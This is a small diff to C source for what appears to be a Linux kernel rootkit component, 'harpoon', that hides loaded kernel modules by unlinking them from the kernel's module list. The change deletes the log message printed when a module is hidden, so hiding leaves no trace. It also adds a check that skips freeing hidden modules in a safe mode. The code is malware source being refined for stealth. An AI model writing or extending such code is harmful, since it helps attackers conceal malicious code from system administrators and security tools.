@@ -17,6 +17,10 @@ struct harpoon_module *harpoon_new_mod(struct module *module){
 }
 
 void harpoon_del_mod(struct harpoon_module *module){
+    if(module->is_hidden && SAFE_MODE){
+        return;
+    }
+
     mutex_lock(&module->lock);
     list_del(&module->list);
     kfree(module);
@@ -28,7 +32,6 @@ void harpoon_mod_hide(struct harpoon_module *module){
         return;
     }
     mutex_lock(&module->lock);
-    printk(KERN_INFO "Hidding module");
     list_del(&module->self->list);
     mutex_unlock(&module->lock);
     module->is_hidden = 1;
